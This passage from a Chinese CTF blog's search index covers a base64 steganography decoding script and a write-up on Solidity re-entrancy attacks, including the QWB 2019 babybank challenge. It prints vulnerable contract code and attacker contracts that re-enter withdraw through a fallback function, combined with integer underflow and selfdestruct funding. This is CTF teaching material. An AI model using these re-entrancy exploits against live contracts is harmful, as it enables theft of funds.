alt="NK23ZzryPj9YBpi"></p><p><img src="/../images/ZBpPwsz5OeaH3FG-16977914969667.png" alt="ZBpPwsz5OeaH3FG"></p><p>即解码时：</p><p>解密的时候首先把”&#x3D;”删去，然后写出二进制数串，然后从左往右每8位一组，剩余的不足8位丢掉，然后根据转换表获得相应字符</p><p>然后每8位一组，剩余不足的丢弃，</p><p>也就是说红色部分会被忽略，所以即使对其进行改变，解码得到的结果依然不变。</p><p>解密得到的明文是不变的，那么你重新按照正确的加密流程计算一遍，如果发现结果不一样，那么就说明隐藏进了信息。</p><p>CTF题目中出现一大堆base64编码字符串的时候，更需要考虑base64隐写。</p><p>base64的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>base64str = f.readline()<br><br><span class="hljs-comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span><br><span class="hljs-comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span><br>pattern2 = <span class="hljs-string">r&#x27;(\S)==$&#x27;</span><br>pattern1 = <span class="hljs-string">r&#x27;(\S)=$&#x27;</span><br><br><span class="hljs-comment"># 提取后的隐写二进制字符加入binstring中</span><br>binstring = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span><br><span class="hljs-keyword">while</span>(base64str):<br>    <span class="hljs-comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span><br>    <span class="hljs-comment"># 如果无等号，则没有隐藏，无需处理</span><br>    <span class="hljs-keyword">if</span> re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str):<br>        <span class="hljs-comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span><br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str)[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span><br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        <span class="hljs-comment"># mbin格式如0b100，mbin[0:2]为0b</span><br>        <span class="hljs-comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span><br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span><br>        <span class="hljs-comment"># 赋值给stegobin，这就是隐藏的二进制信息</span><br>        stegobin = mbin2[-<span class="hljs-number">4</span>:]<br>        binstring += stegobin<br>    <span class="hljs-keyword">elif</span> re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str):<br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str)[<span class="hljs-number">0</span>]<br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span><br>        stegobin = mbin2[-<span class="hljs-number">2</span>:]<br>        binstring += stegobin<br>    base64str = f.readline()<br><br><span class="hljs-comment"># stegobin将各行隐藏的二进制字符拼接在一起</span><br><span class="hljs-comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(binstring),<span class="hljs-number">8</span>):<br>    <span class="hljs-comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binstring[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="NewstarCtf-2023"><a href="#NewstarCtf-2023" class="headerlink" title="NewstarCtf 2023"></a>NewstarCtf 2023</h4><h5 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h5><p>脚本解码得到</p><p>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p><p>即flag{b4se_1s_4_g0od_c0d3}</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re-Entrancy</title>
    <link href="/2023/10/19/Re-Entrancy/"/>
    <url>/2023/10/19/Re-Entrancy/</url>
    
    <content type="html"><![CDATA[<p>重入攻击是智能合约的经典攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fallback函数是一个特殊的结构，在特定情况下会被触发。</p><p>特点：</p><ol><li>不被命名</li><li>被外部调用，不能被自己合约的函数调用</li><li>一个合约至多只有一个fallback函数</li><li>会在别的合约调用一个本合约没有的函数调用</li><li>当eth被发送给这个合约是没有calldata同时没有receive函数，fallback是会被触发，要设置为payable</li><li>可以包含自己的逻辑</li></ol><p>下述行为消耗的gas都将超过fallback函数限定的gas值：</p><ul><li>向区块链中写数据</li><li>创建一个合约</li><li>调用一个external的函数</li><li>发送ether</li></ul><p>如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    ...<br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] &gt;= amount);<br>        msg.sender.call.value(amount)();<br>        balanceOf[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当balanceof充足时，就会调用转账功能。这个问题是，先转账再记账，若再次调用fallback（）函数，此时balanceof还未减少就会无限调用，可能导致gas不够用，因此需要限制次数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract hack&#123;<br>address instance;<br>Bank b=Bank(instance);<br>bool flag=0;<br>function attack()public&#123;<br>b.withdraw(1 ether);<br>&#125;<br>function () payable&#123;<br>if(!flag)&#123;<br>flag=1;<br>b.withdraw(1 ether);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="【强网杯2019】babybank"><a href="#【强网杯2019】babybank" class="headerlink" title="【强网杯2019】babybank"></a>【强网杯2019】babybank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.23;<br><br>contract babybank &#123;<br>    mapping(address =&gt; uint) public balance;<br>    mapping(address =&gt; uint) public level;<br>    address owner;<br>    uint secret;<br>    <br>    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.<br>    //Gmail is ok. 163 and qq may have some problems.<br>    event sendflag(string md5ofteamtoken,string b64email); <br>    <br>    <br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    //pay for flag<br>    function payforflag(string md5ofteamtoken,string b64email) public&#123;<br>        require(balance[msg.sender] &gt;= 10000000000);<br>        balance[msg.sender]=0;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    &#125;<br>    <br>    modifier onlyOwner()&#123;<br>        require(msg.sender == owner);<br>        _;<br>    &#125;<br>    <br>    //challenge 1 <br>    function profit() public&#123;<br>        require(level[msg.sender]==0);<br>        require(uint(msg.sender) &amp; 0xffff==0xb1b1);<br>        balance[msg.sender]+=1;<br>        level[msg.sender]+=1;<br>    &#125;<br>    <br>    //challenge 2<br>    function set_secret(uint new_secret) public onlyOwner&#123;<br>        secret=new_secret;<br>    &#125;<br>    function guess(uint guess_secret) public&#123;<br>        require(guess_secret==secret);<br>        require(level[msg.sender]==1);<br>        balance[msg.sender]+=1;<br>        level[msg.sender]+=1;<br>    &#125;<br>    <br>    //challenge 3<br>    <br>    function transfer(address to, uint amount) public&#123;<br>        require(balance[msg.sender] &gt;= amount);<br>        require(amount==2);<br>        require(level[msg.sender]==2);<br>        balance[msg.sender] = 0;<br>        balance[to] = amount;<br>    &#125;<br>    <br>    function withdraw(uint amount) public&#123;<br>        require(amount==2);<br>        require(balance[msg.sender] &gt;= amount);<br>        msg.sender.call.value(amount*100000000000000)();<br>        balance[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>pay for flag<br>    function payforflag(string md5ofteamtoken,string b64email) public{<br>        require(balance[msg.sender] &gt;&#x3D; 10000000000);<br>        balance[msg.sender]&#x3D;0;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    }</p><p>当balance超过10000000000是就会触发flag函数。</p><p>发现withdraw函数发现重入漏洞 msg.sender.call.value(amount*100000000000000)();，可以配合整数下溢漏洞从而达到balance的要求。</p><p>要完成withdraw()函数需要完成三个挑战。</p><p>第一个是profit函数</p><p>require(level[msg.sender]&#x3D; &#x3D;0);<br>require(uint(msg.sender) &amp; 0xffff&#x3D;&#x3D;0xb1b1);</p><p>首先需要调用者level为0，其次需要调用者的后四位为b1b1，</p><p>level原本就是0，而后四位则可以通过网站生成固定账号，<a href="https://vanity-eth.tk/">Vanity-ETH | Ethereum vanity address generator</a></p><p>，即可绕过，此时balance以及level都为1，此时来到挑战2.</p><p>挑战2，需要猜到的与设置的guess相同。serect的值可以在合约的部署中找到。合约部署者的最后一次交易的inputdata桉树选择器前四个字节为函数的签名参数就是部署这传入的参数。</p><p>然后就可以调用withdraw函数。</p><p>但是由于合约没有任何blance因此需要先进行转账。</p><p>可以用selfdestruct函数来进行充值。</p><p>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract kill&#123;<br>function kill()payable&#123;<br>selfdestruct(address(0x.....));<br>&#125;<br>&#125;<br>interface BabybankInterface &#123;<br>    function withdraw(uint256 amount) external;<br>    function profit() external;<br>    function guess(uint256 number) external;<br>    function transfer(address to, uint256 amount) external;<br>    function payforflag(string md5ofteamtoken, string b64email) external;<br>&#125;<br>contract hack&#123;<br>address instance;<br>BankInterface b=BankInterface(instance);<br>uint flag=0;<br>function attack()public payable&#123;<br>b.profit();<br>b.guess(0x........);<br>b.withdraw(2);<br>b.payforflag(&#x27;123&#x27;,&#x27;123&#x27;);<br><br>&#125;<br>function()external payable&#123;<br>if(!flag)&#123;<br>flag=1;<br>b.withdraw(2);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。</li><li>进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。</li><li>当C有了2token便可以进行攻击，调用hacker函数即可。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
